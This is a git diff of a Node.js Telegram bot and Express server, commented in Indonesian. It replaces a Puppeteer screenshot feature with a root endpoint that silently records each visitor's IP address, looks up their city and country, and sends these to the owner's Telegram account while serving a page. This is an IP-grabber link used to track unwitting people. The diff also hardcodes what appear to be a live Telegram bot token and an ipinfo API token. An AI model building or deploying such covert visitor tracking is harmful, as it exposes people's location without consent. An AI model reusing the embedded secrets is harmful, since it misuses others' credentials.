@@ -1,10 +1,12 @@
 const TelegramBot = require('node-telegram-bot-api');
 const os = require('os');
 const { v4: uuidv4 } = require('uuid');
-const puppeteer = require('puppeteer');
+// const puppeteer = require('puppeteer');  // Hapus baris ini
 const fs = require('fs');
 const path = require('path');
 const express = require('express');
+const geoip = require('geoip-lite'); // Untuk mendapatkan lokasi dari IP
+const axios = require('axios'); // Untuk mendapatkan informasi lokasi (alternatif)
 
 // Konfigurasi manual (tanpa .env)
 const BOT_TOKEN = '7732562102:AAEH2ydv6d4q3AamrGoZaoo6ZdFcghQcf-A';
@@ -18,132 +20,103 @@ const BOT = new TelegramBot(BOT_TOKEN, { polling: true });
 const app = express();
 const port = 3000;
 
-// Simpan data HTML berdasarkan UUID (menggunakan objek sederhana untuk contoh ini)
-const htmlContentCache = {};
+// Hapus middleware untuk menyajikan file statis (karena tidak ada folder publik)
+// app.use(express.static('public'));  // Hapus baris ini
 
-// Daftar fitur yang akan ditampilkan ke pengguna saat mengirim /start
-const features = `
-  Selamat datang di bot ini! Berikut adalah fitur yang tersedia:
-  1. Mengambil screenshot dari halaman tertentu
-  2. Kirim screenshot ke owner
-  3. Laporan pengunjung
-  4. /create - Membuat link untuk mengambil screenshot
-`;
+// Endpoint untuk menangani akses ke root ("/")
+app.get('/', async (req, res) => {
+    const ip = req.ip;  // Mendapatkan IP address
 
-// Ketika bot menerima pesan /start
-BOT.onText(/\/start/, (msg) => {
-  const chatId = msg.chat.id;
-  const username = msg.chat.username;
-
-  // Mengirimkan daftar fitur yang tersedia
-  BOT.sendMessage(chatId, `Halo ${username}! ${features}`);
-});
-
-// Ketika bot menerima pesan /create
-BOT.onText(/\/create/, async (msg) => {
-  const chatId = msg.chat.id;
-  const uniqueId = uuidv4();  // UUID untuk link dan HTML
-
-  // Simpan HTML ke cache (gunakan readFile untuk membaca file)
-  fs.readFile(path.join(__dirname, 'index.html'), 'utf8', (err, data) => {
-    if (err) {
-      console.error('Gagal membaca file idiot.html:', err);
-      BOT.sendMessage(chatId, 'Terjadi kesalahan saat membuat link screenshot.');
-      return;
+    // Kirim informasi ke owner melalui bot
+    try {
+        const locationInfo = await getLocationInfo(ip);  // Dapatkan informasi lokasi
+        const timestamp = new Date().toLocaleString();
+        const message = `
+        Pengunjung baru!\n
+        IP: ${ip}\n
+        Waktu: ${timestamp}\n
+        Lokasi: ${locationInfo || 'Tidak dapat ditemukan'}
+        `;
+        BOT.sendMessage(OWNER_ID, message);
+        console.log(message); // Log di console server
+    } catch (error) {
+        console.error('Error getting location or sending message:', error);
+        BOT.sendMessage(OWNER_ID, `Error saat mendapatkan informasi pengunjung: IP: ${ip}`);
     }
-    htmlContentCache[uniqueId] = data; // Simpan konten HTML ke cache
 
-    // Menghasilkan link unik
-    const uniqueLink = `https://wulandari-tech-production.up.railway.app/screenshot/${uniqueId}`;
-
-    // Mengirimkan link kepada pengguna
-    BOT.sendMessage(chatId, `Klik di sini untuk mengambil screenshot: ${uniqueLink}`);
-  });
+    // Kirim index.html
+    res.sendFile(path.join(__dirname, 'index.html')); // Pastikan index.html ada di folder proyek
 });
 
+// Fungsi untuk mendapatkan informasi lokasi dari IP (menggunakan geoip-lite)
+async function getLocationInfo(ip) {
+    try {
+        const geo = geoip.lookup(ip);
+        if (geo) {
+            return `${geo.city}, ${geo.country}`;
+        }
+        return 'Tidak dapat ditemukan';
+    } catch (error) {
+        console.error('Error looking up location:', error);
+        return 'Tidak dapat ditemukan (error geoip)';
+    }
+}
 
-// Endpoint untuk menangani permintaan screenshot dengan link yang di-generate
-app.get('/screenshot/:id', async (req, res) => {
-  const visitorIp = req.ip;
-  const uniqueId = req.params.id;  // Gunakan UUID dari URL
 
-  const htmlContent = htmlContentCache[uniqueId];
+// Fungsi untuk mendapatkan informasi lokasi dari IP (menggunakan alternatif axios)
+//  Jika geoip-lite gagal,  coba metode ini.
+async function getLocationInfoAlternative(ip) {
+    try {
+        const response = await axios.get(`https://ipinfo.io/${ip}?token=4ed2c4496226d5`); // Ganti dengan token ipinfo Anda jika ada
+        if (response.data && response.data.city && response.data.country) {
+            return `${response.data.city}, ${response.data.country}`;
+        }
+        return 'Tidak dapat ditemukan';
+    } catch (error) {
+        console.error('Error getting location (axios):', error);
+        return 'Tidak dapat ditemukan (axios error)';
+    }
+}
 
-  if (!htmlContent) {
-    res.status(404).send('Halaman tidak ditemukan.'); // Handle jika UUID tidak valid atau sudah kedaluwarsa
-    return;
-  }
 
-  const screenshotUrl = `data:text/html;charset=UTF-8,${encodeURIComponent(htmlContent)}`;
 
-  const screenshotFilePath = await takeScreenshot(screenshotUrl, uniqueId);
+// Hapus fungsi takeScreenshot (tidak digunakan lagi)
+// async function takeScreenshot(url, clientId) {
+//     const fileName = `screenshot_${clientId}_${Date.now()}.png`;
+//     const filePath = path.join(__dirname, fileName);
 
-  if (screenshotFilePath) {
-    // Kirim screenshot ke Owner via Telegram
-    BOT.sendPhoto(OWNER_ID, screenshotFilePath, { caption: `Pengunjung datang dari IP: ${visitorIp}` })
-      .then(() => {
-        // Kirim respon HTTP setelah screenshot berhasil diambil
-        res.send('Screenshot telah diambil dan dikirim ke owner!');
+//     try {
+//         console.log(`[${clientId}] Mengambil screenshot dari URL: ${url}`);
+//         const browser = await puppeteer.launch({
+//             headless: true,
+//             args: [
+//                 '--no-sandbox',
+//                 '--disable-setuid-sandbox',
+//                 '--disable-dev-shm-usage',
+//                 '--disable-accelerated-2d-canvas',
+//                 '--no-zygote',
+//                 '--disable-gpu',
+//             ],
+//         });
 
-        // Hapus file screenshot setelah 10 detik
-        setTimeout(() => {
-          try {
-            fs.unlinkSync(screenshotFilePath);
-          } catch (unlinkErr) {
-            console.error(`[${uniqueId}] Gagal menghapus file screenshot:`, unlinkErr);
-          }
-        }, 10000);
+//         const page = await browser.newPage();
+//         await page.goto(url, { waitUntil: 'networkidle0', timeout: 60000 });
+//         console.log(`[${clientId}] Halaman dimuat, mengambil screenshot...`);
+//         await page.screenshot({ path: filePath, fullPage: true });
+//         await browser.close();
 
-        // Hapus HTML dari cache setelah selesai (opsional, tergantung kebutuhan)
-        delete htmlContentCache[uniqueId];
+//         console.log(`[${clientId}] Screenshot berhasil diambil`);
+//         return filePath;
+//     } catch (err) {
+//         console.error(`[${clientId}] Gagal saat mengambil screenshot:`, err);
+//         console.error(err.stack);
+//         return null;
+//     }
+// }
 
-      })
-      .catch(err => {
-        console.error(`[${uniqueId}] Gagal kirim screenshot ke owner:`, err.message);
-        res.send('Gagal mengambil screenshot.');
-      });
-  } else {
-    res.send('Gagal mengambil screenshot.');
-  }
-});
 
 
 // Mulai server Express
 app.listen(port, () => {
-  console.log(`Server berjalan di http://localhost:${port}`);
+    console.log(`Server berjalan di http://localhost:${port}`);
 });
-
-
-// Fungsi ambil screenshot pakai Puppeteer
-async function takeScreenshot(url, clientId) {
-  const fileName = `screenshot_${clientId}_${Date.now()}.png`;
-  const filePath = path.join(__dirname, fileName);
-
-  try {
-    console.log(`[${clientId}] Mengambil screenshot dari URL: ${url}`);
-    const browser = await puppeteer.launch({
-      headless: true, // Aktifkan kembali headless untuk produksi
-      args: [
-        '--no-sandbox',
-        '--disable-setuid-sandbox',
-        '--disable-dev-shm-usage',
-        '--disable-accelerated-2d-canvas',
-        '--no-zygote',
-        '--disable-gpu',
-      ],
-    });
-
-    const page = await browser.newPage();
-    await page.goto(url, { waitUntil: 'networkidle0', timeout: 60000 });
-    console.log(`[${clientId}] Halaman dimuat, mengambil screenshot...`);
-    await page.screenshot({ path: filePath, fullPage: true });
-    await browser.close();
-
-    console.log(`[${clientId}] Screenshot berhasil diambil`);
-    return filePath;
-  } catch (err) {
-    console.error(`[${clientId}] Gagal saat mengambil screenshot:`, err);
-    console.error(err.stack); // Cetak stack trace untuk debugging
-    return null;
-  }
-}
